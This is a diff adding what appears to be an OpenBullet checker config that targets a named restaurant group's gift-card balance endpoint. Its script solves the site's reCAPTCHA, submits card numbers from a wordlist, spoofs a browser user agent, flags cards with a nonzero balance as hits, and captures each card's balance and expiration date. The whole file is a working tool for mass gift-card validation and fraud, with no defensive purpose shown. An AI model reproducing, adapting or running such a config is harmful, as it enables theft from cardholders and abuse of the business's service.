@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Atrias GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-19T16:32:36.2657214+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://atrias.alohaenterprise.com/memberlink/GiftCards.html?companyID=rhl01" "6LfF9y8UAAAAAMXzXpAhDZ8NNA7bYoFyx1q2XhxC" -> VAR "captcha" 
+REQUEST GET "https://atrias.alohaenterprise.com/servlet/MemberLinkSVServlet?companyID=rhl01&requestType=checkSVCardForEPin&cardNumber=<USER>&reCaptchaResponse=<captcha>&_=1537369649251" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://atrias.alohaenterprise.com/memberlink/GiftCards.html?companyID=rhl01" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "{\"cardBalance\":0" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "{\"cardBalance\":0" 
+  KEYCHAIN Retry OR 
+    KEY "{\"message\":\"INVALID_RECAPTCHA\"}" 
+PARSE "<SOURCE>" LR "cardBalance\"" "\"" Recursive=FALSE -> CAP "Balance" "$" "" 
+PARSE "<SOURCE>" LR "expirationDate\"" "\"" Recursive=FALSE -> CAP "Exp" "" "" 
